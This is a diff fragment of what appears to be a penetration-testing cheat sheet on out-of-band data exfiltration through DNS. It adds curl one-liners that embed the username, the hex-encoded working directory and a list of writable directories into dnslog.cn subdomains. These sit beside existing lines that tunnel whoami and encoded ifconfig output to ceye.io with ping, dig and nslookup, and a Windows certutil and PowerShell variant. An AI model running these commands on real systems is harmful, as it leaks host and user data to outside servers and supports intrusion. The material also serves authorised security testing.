@@ -13,6 +13,12 @@ ipconfig > test && certutil -encodehex -f test test.hex 4 && powershell $text=Ge
 ```bash
 ping `whoami`.xxxxx.ceye.io
 
+curl `id -un`.xxx.dnslog.cn
+
+curl `pwd|od -A n -t x1|sed 's/ //g'`.xxx.dnslog.cn
+
+curl $(find /xxx/xx/xx -type d -writable |od -A n -t x1|sed 's/ //g'|sed -r 's/$/.mp3smh.dnslog.cn/g')  # 查找可写目录
+
 var=11111 && for b in $(ifconfig|xxd -p ); do var=$((var+1)) && dig $var.$b.xxxxx.ceye.io; done
 
 var=11111 && for i in $(ifconfig|base64|awk '{gsub(/.{50}/,"&\n")}1'); do var=$((var+1)) && nslookup $var.$i.xxxxx.ceye.io; done
